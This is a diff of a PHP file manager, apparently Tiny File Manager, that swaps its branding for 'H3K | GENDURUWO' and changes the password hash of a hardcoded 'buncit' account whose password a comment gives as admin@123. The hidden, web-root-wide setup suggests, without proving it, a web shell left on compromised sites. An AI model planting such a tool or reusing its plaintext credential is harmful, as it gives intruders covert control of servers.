@@ -3,7 +3,7 @@
 $CONFIG = '{"lang":"en","error_reporting":false,"show_hidden":true,"hide_Cols":false,"theme":"dark"}';
 
 /**
- * H3K | BUNCIT GEMOY GANTENG 🐡🐡🐡 V2.5.3
+ * H3K | GENDURUWO V2.5.3
  * @author CCP Programmers
  * @github https://github.com/prasathmani/tinyfilemanager
  * @link https://tinyfilemanager.github.io
@@ -13,7 +13,7 @@ $CONFIG = '{"lang":"en","error_reporting":false,"show_hidden":true,"hide_Cols":f
 define('VERSION', '2.5.3');
 
 //Application Title
-define('APP_TITLE', 'BUNCIT GEMOY GANTENG 🐡🐡🐡');
+define('APP_TITLE', 'GENDURUWO');
 
 // --- EDIT BELOW CONFIGURATION CAREFULLY ---
 
@@ -26,7 +26,7 @@ $use_auth = true;
 // Users: array('Username' => 'Password', 'Username2' => 'Password2', ...)
 // Generate secure password hash - https://tinyfilemanager.github.io/docs/pwd.html
 $auth_users = array(
-    'buncit' => '$2y$10$MPETQ7jMAUHSTmHB7ng/wuzvGcOJn8MC62AQUnwthED/2/FgZ9fR6', //admin@123
+    'buncit' => '$2y$10$YKbRIdxLXKaeaBG3obRUUu5eplo2KwasWA76oAVlL.p2R3FsDQg9G', //admin@123
 );
 
 // Readonly users
@@ -56,11 +56,11 @@ $edit_files = true;
 // Doc - http://php.net/manual/en/timezones.php
 $default_timezone = 'Etc/UTC'; // UTC
 
-// Root path for BUNCIT GEMOY GANTENG 🐡🐡🐡
+// Root path for GENDURUWO
 // use absolute path of directory i.e: '/var/www/folder' or $_SERVER['DOCUMENT_ROOT'].'/folder'
 $root_path = $_SERVER['DOCUMENT_ROOT'];
 
-// Root url for links in BUNCIT GEMOY GANTENG 🐡🐡🐡.Relative to $http_host. Variants: '', 'path/to/subfolder'
+// Root url for links in GENDURUWO.Relative to $http_host. Variants: '', 'path/to/subfolder'
 // Will not working if $root_path will be outside of server document root
 $root_url = '';
 
@@ -381,7 +381,7 @@ if ($use_auth) {
                         </div>
                         <div class="footer text-center">
                             &mdash;&mdash; &copy;
-                            <a href="https://tinyfilemanager.github.io/" target="_blank" class="text-decoration-none text-muted" data-version="<?php echo VERSION; ?>">BUNCIT GEMOY GANTENG 🐡🐡🐡 2024</a> &mdash;&mdash;
+                            <a href="https://tinyfilemanager.github.io/" target="_blank" class="text-decoration-none text-muted" data-version="<?php echo VERSION; ?>">GENDURUWO 2024</a> &mdash;&mdash;
                         </div>
                     </div>
                 </div>
@@ -1592,7 +1592,7 @@ if (isset($_GET['help'])) {
             <div class="card-body">
                 <div class="row">
                     <div class="col-xs-12 col-sm-6">
-                        <p><h3><a href="https://github.com/prasathmani/tinyfilemanager" target="_blank" class="app-v-title"> BUNCIT GEMOY GANTENG 🐡🐡🐡 <?php echo VERSION; ?></a></h3></p>
+                        <p><h3><a href="https://github.com/prasathmani/tinyfilemanager" target="_blank" class="app-v-title"> GENDURUWO <?php echo VERSION; ?></a></h3></p>
                         <p>Author: Prasath Mani</p>
                         <p>Mail Us: <a href="mailto:ccpprogrammers@gmail.com">ccpprogrammers[at]gmail.com</a> </p>
                     </div>
@@ -2221,9 +2221,9 @@ $tableTheme = (FM_THEME == "dark") ? "text-white bg-dark table-dark" : "bg-white
                     <a href="javascript:document.getElementById('a-copy').click();" class="btn btn-small btn-outline-primary btn-2"><i class="fa fa-files-o"></i> <?php echo lng('Copy') ?> </a></li>
             </ul>
         </div>
-        <div class="col-3 d-none d-sm-block"><a href="https://tinyfilemanager.github.io" target="_blank" class="float-right text-muted">BUNCIT GEMOY GANTENG 🐡🐡🐡 <?php echo VERSION; ?></a></div>
+        <div class="col-3 d-none d-sm-block"><a href="https://tinyfilemanager.github.io" target="_blank" class="float-right text-muted">GENDURUWO <?php echo VERSION; ?></a></div>
         <?php else: ?>
-            <div class="col-12"><a href="https://tinyfilemanager.github.io" target="_blank" class="float-right text-muted">BUNCIT GEMOY GANTENG 🐡🐡🐡 <?php echo VERSION; ?></a></div>
+            <div class="col-12"><a href="https://tinyfilemanager.github.io" target="_blank" class="float-right text-muted">GENDURUWO <?php echo VERSION; ?></a></div>
         <?php endif; ?>
     </div>
 </form>
@@ -3481,7 +3481,7 @@ class FM_Zipper_Tar
         if (strlen($CONFIG)) {
             $data = fm_object_to_array(json_decode($CONFIG));
         } else {
-            $msg = 'BUNCIT GEMOY GANTENG 🐡🐡🐡<br>Error: Cannot load configuration';
+            $msg = 'GENDURUWO<br>Error: Cannot load configuration';
             if (substr($fm_url, -1) == '/') {
                 $fm_url = rtrim($fm_url, '/');
                 $msg .= '<br>';
@@ -3637,7 +3637,7 @@ global $lang, $root_url, $favicon_path;
 <head>
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-    <meta name="description" content="Web based BUNCIT GEMOY GANTENG 🐡🐡🐡 in PHP, Manage your files efficiently and easily with BUNCIT GEMOY GANTENG 🐡🐡🐡">
+    <meta name="description" content="Web based GENDURUWO in PHP, Manage your files efficiently and easily with GENDURUWO">
     <meta name="author" content="CCP Programmers">
     <meta name="robots" content="noindex, nofollow">
     <meta name="googlebot" content="noindex">
@@ -3710,7 +3710,7 @@ $isStickyNavBar = $sticky_navbar ? 'navbar-fixed' : 'navbar-normal';
 <head>
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-    <meta name="description" content="Web based BUNCIT GEMOY GANTENG 🐡🐡🐡 in PHP, Manage your files efficiently and easily with BUNCIT GEMOY GANTENG 🐡🐡🐡">
+    <meta name="description" content="Web based GENDURUWO in PHP, Manage your files efficiently and easily with GENDURUWO">
     <meta name="author" content="CCP Programmers">
     <meta name="robots" content="noindex, nofollow">
     <meta name="googlebot" content="noindex">
@@ -4223,7 +4223,7 @@ function lng($txt) {
     global $lang;
 
     // English Language
-    $tr['en']['AppName']        = 'BUNCIT GEMOY GANTENG 🐡🐡🐡';      $tr['en']['AppTitle']           = 'BUNCIT GEMOY GANTENG 🐡🐡🐡';
+    $tr['en']['AppName']        = 'GENDURUWO';      $tr['en']['AppTitle']           = 'GENDURUWO';
     $tr['en']['Login']          = 'Sign in';                $tr['en']['Username']           = 'Username';
     $tr['en']['Password']       = 'Password';               $tr['en']['Logout']             = 'Sign Out';
     $tr['en']['Move']           = 'Move';                   $tr['en']['Copy']               = 'Copy';
